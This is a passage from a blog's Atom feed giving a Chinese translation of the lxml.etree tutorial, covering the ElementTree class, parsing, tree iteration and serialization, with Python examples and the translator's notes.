    <content type="html"><![CDATA[<p>原文来源：<code>https://lxml.de/tutorial.html</code></p><p>本文目录：</p><ol><li>ElementTree 类</li><li>从字符串和文件中解析</li></ol><a id="more"></a><h2 id="ElementTree-类"><a href="#ElementTree-类" class="headerlink" title="ElementTree 类"></a>ElementTree 类</h2><p>一个 元素树（ElementTree）对象大体上可以看成是一个 包含根节点的树的文档包装器（顾名思义：ElementTree 是用来包装XML文档的，意味着你要给他传递一个XML文档对象）。其还提供了数个方法以供序列化和常见的文档处理功能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.XML(<span class="string">'''\;;此处反斜杠好像是为了避免出现开头的空格导致格式混乱</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;!DOCTYPE root SYSTEM "test" [ &lt;!ENTITY tasty "parsnips"&gt; ]&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;root&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>  &lt;a&gt;&amp;tasty;&lt;/a&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;/root&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree = etree.ElementTree(root)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tree.docinfo.xml_version)</span><br><span class="line"><span class="number">1.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tree.docinfo.doctype)</span><br><span class="line">&lt;!DOCTYPE root SYSTEM <span class="string">"test"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree.docinfo.public_id = <span class="string">'-//W3C//DTD XHTML 1.0 Transitional//EN'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree.docinfo.system_url = <span class="string">'file://local.dtd'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tree.docinfo.doctype)</span><br><span class="line">&lt;!DOCTYPE root PUBLIC <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"file://local.dtd"</span>&gt;</span><br></pre></td></tr></table></figure><br><p>一个 ElementTree 对象也是当你调用 <em>parse()</em> 函数来解析文件或者类文件对象时所返回的内容（详情见下文的 parsing ‘解析’一节）</p><p>与 Element 类只序列化出单个元素的一个重要区别就是，ElementTree 类会序列化出一个完整的文档，也就是包含了顶层的（top-level）处理指令和注释，当然还有一个 DOCTYPE 和其他 DTD 内容（DTD content）：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(etree.tostring(tree))  <span class="comment"># lxml 1.3.4 and later</span></span><br><span class="line">&lt;!DOCTYPE root PUBLIC <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"file://local.dtd"</span> [ &lt;!ENTITY tasty <span class="string">"parsnips"</span>&gt;] &gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;a&gt;parsnips&lt;/a&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><br><p>在原始的 xml.etree.ElementTree 实现 和低于 1.3.3 版本的 lxml 实现中，序列化一个 ElementTree 时的输出和序列化一个 root 元素结果看起来是一样的：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(etree.tostring(tree.getroot()))</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;a&gt;parsnips&lt;/a&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><br><p>这种序列化的行为在 lxml 1.3.4 中已经改变了。以前，树的序列化不包含 DTD 内容，这就使得 lxml 在输入输出循环中失去了 DTD 信息。</p><br><h2 id="从字符串和文件中解析"><a href="#从字符串和文件中解析" class="headerlink" title="从字符串和文件中解析"></a>从字符串和文件中解析</h2><p>lxml.etree 支持从所有重要（常见）的源头，也就是&lt;字符串&gt;、&lt;文件&gt;、&lt;URL（包括http/tcp）&gt;、类文件对象中，以多种方式解析 XML 数据。主要的解析函数有 <strong>fromstring()</strong> 和 <strong>parse()</strong> ，这两个函数都使用 数据源（source）作为第一个参数，通常使用默认的解析器，但是你可以自己传递一个不同的解析器给第二个参数。</p><br><h3 id="fromstring-函数"><a href="#fromstring-函数" class="headerlink" title="fromstring() 函数"></a>fromstring() 函数</h3><p>这是解析字符串的最简单的一个函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_data = <span class="string">"&lt;root&gt;root_text&lt;/root&gt;"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.fromstring(my_data)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> type(root)</span><br><span class="line">&lt;type <span class="string">'lxml.etree._Element'</span>&gt;<span class="string">'''注意这里是 Element 类型，而 parse() 返回 ElementTree 类型'''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> root.tag</span><br><span class="line">root</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root)</span><br><span class="line"><span class="string">'&lt;root&gt;root_text&lt;/root&gt;'</span></span><br></pre></td></tr></table></figure><br><h3 id="XML-函数"><a href="#XML-函数" class="headerlink" title="XML() 函数"></a>XML() 函数</h3><p>XML() 表现地和 fromstring() 很相似，但常常是将 XML 字面量（直接量）直接填到参数里，而不是使用一个额外的变量：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.XML(<span class="string">"&lt;html&gt;Hello&lt;/html&gt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> type(root)</span><br><span class="line">&lt;type <span class="string">'lxml.etree._Element'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> root.tag</span><br><span class="line">html</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root)</span><br><span class="line"><span class="string">'&lt;html&gt;Hello&lt;/html&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> etree.tostring(root)</span><br><span class="line">&lt;html&gt;Hello&lt;/html&gt;</span><br></pre></td></tr></table></figure><br><p>类似的还有一个 <strong>HTML()</strong> 函数：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.HTML(<span class="string">"&lt;p&gt;some data&lt;/p&gt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> type(root)</span><br><span class="line">&lt;type <span class="string">'lxml.etree._Element'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> root.tag</span><br><span class="line">html</span><br><span class="line">&gt;&gt;&gt; ??? WHAT IS THT FUCK IN HERE ??? </span><br><span class="line"><span class="meta">... </span>The Answer <span class="keyword">is</span>: ... THAT, HTML() automatically complete the &lt;p&gt; by wrapping it <span class="keyword">with</span> &lt;html&gt; <span class="keyword">and</span> &lt;body&gt;.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> etree.tostring(root)</span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;p&gt;some data&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><br><h3 id="parse-函数"><a href="#parse-函数" class="headerlink" title="parse() 函数"></a>parse() 函数</h3><p>这个函数是被用来从<strong>文件</strong>或者<strong>类文件对象</strong>中解析文档的。<br>参考下面这个类文件对象的例子，下面这个例子的代码使用了 <strong>BytesIO 类</strong> （这个类可以用字符串模拟从文件读取，而不是去读一个真实的外部文件）。BytesIO 类来自于 Python2.6 及以后版本的 <strong>io</strong> 模块。在稍老一点版本的 Python 里，你不得不使用 StringIO 模块里的 <strong>StringIO 类</strong> 来做到这一点。然而，在现实中这么做显然是给自己找麻烦，要么使用一个真实的文件，要么直接使用上述的几个函数来解析字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file_like_obj = BytesIO(<span class="string">b"&lt;html&gt;hello&lt;/html&gt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(file_like_obj)</span><br><span class="line">&lt;type <span class="string">'_io.BytesIO'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree = etree.parse(file_like_obj);;这里你可以指定第二个参数作为解析器</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(tree)</span><br><span class="line">&lt;type <span class="string">'lxml.etree._ElementTree'</span>&gt;;;注意这里是 ElementTree 对象了</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(tree)</span><br><span class="line"><span class="string">'&lt;html&gt;hello&lt;/html&gt;'</span></span><br></pre></td></tr></table></figure><p>再次注意：parse() 返回一个 ElementTree 对象而不是可以作为字符串解析器( tostring() )参数的 ELement 对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; etree.tostring(tree);;那这里为什么也可以解析 ElementTree 对象???</span><br><span class="line"><span class="string">'&lt;html&gt;hello&lt;/html&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = tree.getroot()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(root)</span><br><span class="line">&lt;type <span class="string">'lxml.etree._Element'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> root.tag</span><br><span class="line">html</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root)</span><br><span class="line"><span class="string">'&lt;html&gt;hello&lt;/html&gt;'</span></span><br></pre></td></tr></table></figure><p><br>这种区别背后的原因是，parse() 从文件中返回一个完整的文档而字符串解析函数通常是被用来解析XML片段。<br><strong>parse()</strong> 函数支持一下任意类型的文件源：</p><ol><li>一个打开的文件对象（确保是以二进制模式打开的：”b”）</li><li>类文件对象（特点是：有一个 <code>.read( byte_count )</code>  方法每次调用都会返回一个字节串 [byte string] ）</li><li>一个文件名的字符串（相对路径，绝对路径）</li><li>HTTP 或 FTP 的 URL 地址字符串</li></ol><p>注意：传递一个文件名或者URL通常比传递一个打开的文件或者类文件对象要快得多。<br>然而，位于 libxml2 库中的 HTTP/FTP 客户端程序的实现是相当简单的，所以当涉及到像 HTTP 身份验证（这样复杂的任务）的话，需要使用专用的 URL 请求库，比如 <strong>urllib2</strong> 或者 <strong>requests</strong> 。这些库通常会提供一个类文件的对象以接收你从响应流中解析出来的结果。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文来源：&lt;code&gt;https://lxml.de/tutorial.html&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;本文目录：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ElementTree 类&lt;/li&gt;
&lt;li&gt;从字符串和文件中解析&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>lxml etree tutorial - part three</title>
    <link href="https://pwn4justice.github.io/2019/06/06/lxml-etree-tutorial-part-three/"/>
    <id>https://pwn4justice.github.io/2019/06/06/lxml-etree-tutorial-part-three/</id>
    <published>2019-06-06T09:26:26.000Z</published>
    <updated>2019-07-30T06:10:43.348Z</updated>
    
    <content type="html"><![CDATA[<p>原文来源：<code>https://lxml.de/tutorial.html</code></p><p>本文内容：</p><ol><li>树的迭代</li><li>序列化</li></ol><a id="more"></a><h3 id="树的迭代（Tree-iteration）"><a href="#树的迭代（Tree-iteration）" class="headerlink" title="树的迭代（Tree iteration）"></a>树的迭代（Tree iteration）</h3><p>对于上面的问题，也就是当你想反复地遍历文档树并对其中元素们进行操作的时候，树迭代是一个方便的解决方案。元素对象（Elements）提供了一个树迭代器来做到这些。这个迭代器（ <strong>obj.iter()</strong> ）会以<em>文档顺序（document order）</em>产生元素对象，例如：<strong>如果你把树序列化成XML，它们的标签会按顺序出现</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.Element(<span class="string">"root"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.SubElement(root, <span class="string">"child"</span>).text = <span class="string">"child1"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.SubElement(root, <span class="string">"child"</span>).text = <span class="string">"child2"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.SubElement(root, <span class="string">"another"</span>).text = <span class="string">"child3"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> etree.tostring(root, pretty_print=<span class="literal">True</span>)</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;child&gt;child1&lt;/child&gt;</span><br><span class="line">  &lt;child&gt;child2&lt;/child&gt;</span><br><span class="line">  &lt;another&gt;child3&lt;/another&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> element <span class="keyword">in</span> root.iter():</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> <span class="string">"%s - %s"</span> % (element.tag, element.text)</span><br><span class="line">...</span><br><span class="line">root - <span class="literal">None</span></span><br><span class="line">child - child1</span><br><span class="line">child - child2</span><br><span class="line">another - child3</span><br></pre></td></tr></table></figure><p><br>如果你只对单个标签感兴趣，你可以将标签名作为参数传递给 <em>iter()</em> 来进行过滤。从 lxml 3.0 开始，你可以向 <em>iter()</em> 传递多个标签名，以便在迭代过程中拦截多个标签。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> element <span class="keyword">in</span> root.iter(<span class="string">"child"</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> <span class="string">"%s - %s"</span> % (element.tag, element.text)</span><br><span class="line">...</span><br><span class="line">child - child1</span><br><span class="line">child - child2</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> element <span class="keyword">in</span> root.iter(<span class="string">"child"</span>, <span class="string">"another"</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> <span class="string">"%s - %s"</span> % (element.tag, element.text)</span><br><span class="line">...</span><br><span class="line">child - child1</span><br><span class="line">child - child2</span><br><span class="line">another - child3</span><br></pre></td></tr></table></figure><p><br>默认来说，迭代会生成树中的所有节点，包括处理指令（ProcessInstruction），注释（Comment）和实体实例（Entity instances）。如果你只想保证元素对象（Element objects）被返回，可以传递 Element 工厂方法给标签参数：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root.append(etree.Entity(<span class="string">"#234"</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root.append(etree.Comment(<span class="string">"my comment here"</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> element <span class="keyword">in</span> root.iter():</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> isinstance(element.tag, basestring): <span class="comment"># or 'str' in Python3</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">print</span> <span class="string">"%s - %s"</span> % (element.tag, element.text)</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span>            <span class="keyword">print</span> <span class="string">"Special: %s - %s."</span> % (element, element.text)</span><br><span class="line">...</span><br><span class="line">root - <span class="literal">None</span></span><br><span class="line">child - child1</span><br><span class="line">child - child2</span><br><span class="line">another - child3</span><br><span class="line">Special: &amp;<span class="comment">#234; - &amp;#234;.</span></span><br><span class="line">Special: &lt;!--my comment here--&gt; - my comment here.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> element <span class="keyword">in</span> root.iter(tag=etree.Element):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> <span class="string">"%s - %s"</span> % (element.tag, element.text)</span><br><span class="line">...</span><br><span class="line">root - <span class="literal">None</span></span><br><span class="line">child - child1</span><br><span class="line">child - child2</span><br><span class="line">another - child3</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> element <span class="keyword">in</span> root.iter(tag=etree.Comment):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> <span class="string">"%s - %s"</span> % (element, element.text)</span><br><span class="line">...</span><br><span class="line">&lt;!--my comment here--&gt; - my comment here</span><br></pre></td></tr></table></figure><p><br>注意，当传递通配符 <code>*</code> 给tag参数的时候，也会生成所有 Element 节点（即仅生成 Elements 对象）。<br>在lxml.etree库中，元素对象（Element）为树提供了更深层次的迭代器，这些迭代器可以不同的方向开始迭代，比如从孩子方向，从父母（甚至祖先）方向或从兄弟方向。</p><h3 id="序列化-（Serialization）"><a href="#序列化-（Serialization）" class="headerlink" title="序列化 （Serialization）"></a>序列化 （Serialization）</h3><p>通常使用 <strong>tostring()</strong> 函数返回一个字符串来进行序列化，或者使用 <strong>ElementTree.wirte()</strong> 方法写入一个文件，或一个类文件对象（file-like object），或一个URL（通过 FTP 的 PUT 或 HTTP 的 POST 等方式）。这两种方式可以接收一些相同的关键字参数，比如都可以用 <strong>pretty_print</strong> 来格式化输出，或者 <strong>encoding</strong> 来指定输出的编码格式而不是采用纯ASCII码的形式输出，当然还有 <strong>xml_declaration</strong> 等：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.XML(<span class="string">'&lt;root&gt;&lt;a&gt;&lt;b/&gt;&lt;/a&gt;&lt;/root&gt;'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root)</span><br><span class="line"><span class="string">'&lt;root&gt;&lt;a&gt;&lt;b/&gt;&lt;/a&gt;&lt;/root&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> etree.tostring(root, pretty_print=<span class="literal">True</span>)</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;a&gt;</span><br><span class="line">    &lt;b/&gt;</span><br><span class="line">  &lt;/a&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> etree.tostring(root, encoding=<span class="string">'iso-8859-1'</span>)</span><br><span class="line">&lt;?xml version='1.0' encoding='iso-8859-1'?&gt;</span><br><span class="line">&lt;root&gt;&lt;a&gt;&lt;b/&gt;&lt;/a&gt;&lt;/root&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> etree.tostring(root, xml_declaration=<span class="literal">True</span>)</span><br><span class="line">&lt;?xml version='1.0' encoding='ASCII'?&gt;</span><br><span class="line">&lt;root&gt;&lt;a&gt;&lt;b/&gt;&lt;/a&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><br>注意：pretty_print 会在末尾加一条新行</p><p>在 lxml2.0 及之后的版本中（也是 ElementTree 1.3 之后），序列化函数不仅仅只可以序列化XML了，也可以序列化HTML或者通过使用 <strong>method</strong> 关键词参数来提取文本内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.XML(<span class="string">'&lt;html&gt;&lt;head/&gt;&lt;body&gt;&lt;p&gt;Hello&lt;br/&gt;World&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root)</span><br><span class="line"><span class="string">'&lt;html&gt;&lt;head/&gt;&lt;body&gt;&lt;p&gt;Hello&lt;br/&gt;World&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root, method=<span class="string">'xml'</span>)</span><br><span class="line"><span class="string">'&lt;html&gt;&lt;head/&gt;&lt;body&gt;&lt;p&gt;Hello&lt;br/&gt;World&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root, method=<span class="string">'html'</span>)</span><br><span class="line"><span class="string">'&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Hello&lt;br&gt;World&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root, method=<span class="string">'html'</span>,pretty_print=<span class="literal">True</span>)</span><br><span class="line"><span class="string">'&lt;html&gt;\n&lt;head&gt;&lt;/head&gt;\n&lt;body&gt;&lt;p&gt;Hello&lt;br&gt;World&lt;/p&gt;&lt;/body&gt;\n&lt;/html&gt;\n'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> etree.tostring(root, method=<span class="string">'html'</span>,pretty_print=<span class="literal">True</span>)</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;p&gt;Hello&lt;br&gt;World&lt;/p&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root, method=<span class="string">'text'</span>)</span><br><span class="line"><span class="string">'HelloWorld'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(etree.tostring(root, method=<span class="string">'text'</span>))</span><br><span class="line">&lt;type <span class="string">'str'</span>&gt;</span><br></pre></td></tr></table></figure><p><br>至于对 XML 文档的序列化，默认对纯文本的编码是 ASCII：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>br = next(root.iter(<span class="string">'br'</span>))  <span class="comment"># get first result of iteration</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>br.tail = <span class="string">u'W\xf6rld'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root, method=<span class="string">'text'</span>)  <span class="comment"># doctest: +ELLIPSIS</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">UnicodeEncodeError: <span class="string">'ascii'</span> codec can<span class="string">'t encode character u'</span>\xf6<span class="string">' ...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; etree.tostring(root, method='</span>text<span class="string">', encoding="UTF-8")</span></span><br><span class="line"><span class="string">b'</span>HelloW\xc3\xb6rld<span class="string">'</span></span><br></pre></td></tr></table></figure><p><br>序列化为Python unicode字符串而不是字节字符串（byte string）会很方便。只需要传递”unicode”给 encoding 参数即可:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root, encoding=<span class="string">'unicode'</span>, method=<span class="string">'text'</span>)</span><br><span class="line"><span class="string">u'HelloW\xf6rld'</span></span><br></pre></td></tr></table></figure><p><br>W3C 里有一篇文章<a href="http://www.w3.org/International/tutorials/tutorial-char-enc/" target="_blank" rel="noopener">关于Unicode字符集和字符编码的文章</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文来源：&lt;code&gt;https://lxml.de/tutorial.html&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;本文内容：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;树的迭代&lt;/li&gt;
&lt;li&gt;序列化&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>lxml.etree tutorial - part two</title>
    <link href="https://pwn4justice.github.io/2019/06/02/lxml-etree-tutorial-part-two/"/>
    <id>https://pwn4justice.github.io/2019/06/02/lxml-etree-tutorial-part-two/</id>
    <published>2019-06-02T08:20:00.000Z</published>
    <updated>2019-07-30T06:10:30.661Z</updated>
    
